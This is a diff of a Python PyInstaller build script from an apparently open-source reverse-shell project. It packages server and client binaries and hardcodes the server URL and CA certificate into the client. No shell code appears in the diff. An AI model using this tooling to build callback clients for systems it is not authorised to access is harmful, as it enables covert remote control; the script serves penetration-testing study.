@@ -1,23 +1,15 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell
+# https://github.com/EONRaider/BCA-Phantom
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import argparse
-import configparser
 import functools
-import platform
 from pathlib import Path
+from platform import system
 from typing import Container
 
 import PyInstaller.__main__
-
-
-def os_sep() -> str:
-    """Gets the path separator for the current operating system.
-    Windows systems use ';' as a separator, whereas macOS/Linux/Unix
-    use ':'."""
-    return ";" if platform.system() == "Windows" else ":"
 
 
 def pyinstaller(func):
@@ -30,11 +22,23 @@ def pyinstaller(func):
     return build_binary
 
 
+def os_name() -> str:
+    """Gets the name of the current operating system."""
+    return system().lower()
+
+
+def os_sep() -> str:
+    """Gets the path separator for the current operating system.
+    Windows systems use ';' as a separator, whereas macOS/Linux/Unix
+    use ':'."""
+    return ";" if os_name() == "windows" else ":"
+
+
 @pyinstaller
 def server(args: argparse.Namespace) -> list[str]:
     """Set-up the arguments required by PyInstaller to build the
     server binary."""
-    cmd = ["server/server.py", "--onefile"]
+    cmd = ["src/server/server.py", "--onefile", "--name", f"{os_name()}_server"]
     if args.server_cert is not None:
         cmd.extend(["--add-data", f"{args.server_cert}{os_sep()}."])
     return cmd
@@ -44,26 +48,24 @@ def server(args: argparse.Namespace) -> list[str]:
 def client(args: argparse.Namespace) -> list[str]:
     """Set-up the arguments required by PyInstaller to build the
     client binary."""
+    config = {"url": args.url}
+    cmd = ["src/client/client.py", "--onefile", "--hidden-import", "config"]
+    os: str = os_name()
 
-    '''A configuration file named 'client.cfg' is created with 
-    hard-coded server address, port and CA information that allows 
+    if args.ca_cert is None:
+        cmd.extend(["--name", f"http_{os}_client"])
+    else:  # Client bundles CA certificate file in PEM format
+        config.update({"ca_cert": Path(args.ca_cert).name})
+        cmd.extend(["--name", f"https_{os}_client",
+                    "--add-data", f"{args.ca_cert}{os_sep()}."])
+
+    '''A configuration file named 'client.py' is created with hardcoded 
+    server URL and path to CA certificate file, if any, that allows 
     seamless connection of the binary client to the server. This file 
     is bundled in the binary and read on execution.'''
-    config = configparser.ConfigParser()
-    config["CLIENT"] = {
-        "host": args.host,
-        "port": str(args.port),
-        "ca-certificate": Path(args.ca_cert).name
-    }
-
-    with open(file="client.cfg", mode="w") as config_file:
-        config.write(config_file)
-
-    sep = os_sep()
-    cmd = ["client/client.py",
-           "--onefile",
-           "--add-data", f"{args.ca_cert}{sep}.",
-           "--add-data", f"client.cfg{sep}."]
+    with open(file="src/client/config.py", mode="w") as config_file:
+        for key, value in config.items():
+            config_file.write(f"{key} = '{value}'\n")
 
     return cmd
 
@@ -85,16 +87,11 @@ if __name__ == "__main__":
 
     client_parser = subparsers.add_parser("client")
     client_parser.add_argument(
-        "host",
+        "url",
         type=str,
-        metavar="<hostname/address>",
-        help="Address or hostname of the server to connect to."
-    )
-    client_parser.add_argument(
-        "port",
-        type=int,
-        metavar="<port>",
-        help="Port number exposed by the server."
+        help="Full URL of the server (with optional port number) in the format "
+             "'SCHEME://DOMAIN|ADDRESS[:PORT]'. "
+             "Ex: http://192.168.0.10:8080 or https://your-domain.com"
     )
     client_parser.add_argument(
         "--ca-cert",
